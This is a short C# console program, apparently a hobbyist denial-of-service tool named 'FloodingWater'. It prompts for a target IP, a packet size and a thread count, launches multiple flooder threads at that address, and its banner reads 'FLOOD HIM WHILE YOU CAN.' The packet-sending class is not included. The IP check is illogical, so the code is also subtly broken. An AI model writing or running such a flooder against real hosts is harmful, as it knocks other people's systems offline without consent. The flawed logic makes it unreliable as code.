///edited by mrkoolaid
///

using System;

namespace FloodingWater
{
    class Program
    {    
        static void Main(string[] args)
        {
            string ip = string.Empty;
            int pbytes = 0, threads = 0;

            showInfo();

            while (true)
            {
                try
                {
                    Console.Write("IP (ex; 127.0.0.1): ");
                    ip = Console.ReadLine();

                    Console.Write("Packet Size (kb): ");
                    pbytes = Convert.ToInt32(Console.ReadLine());

                    Console.Write("Threads: ");
                    threads = Convert.ToInt32(Console.ReadLine());

                    //make sure we have an IP to work with
                    if (ip.Length <= 0 && ip == null)
                    {
                        showInfo();
                        Environment.Exit(0);
                    }

                    //loop through and create the threads and run them
                    for (int i = 0; i < threads; i++)
                    {
                        FloodingWater flooder = new FloodingWater(ip, pbytes);
                    }

                    //i moved from your if statement to a switch which will make it easier to implement other commands
                    switch (Console.ReadLine())
                    {
                        case "Q":
                            //cleanup and quit
                            Environment.Exit(0);
                            break;
                    }
                }
                catch (Exception ex)
                {
                    Console.Clear();
                    Console.WriteLine(ex.Message);
                }
            }
        }

        static void showInfo()
        {
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.ForegroundColor = ConsoleColor.White;
            Console.WriteLine("FLOODING WATER. FLOOD HIM WHILE YOU CAN.\nHow to use:");
            Console.WriteLine("\tWrite 'Q' to quit.\n");
        }
    }
}
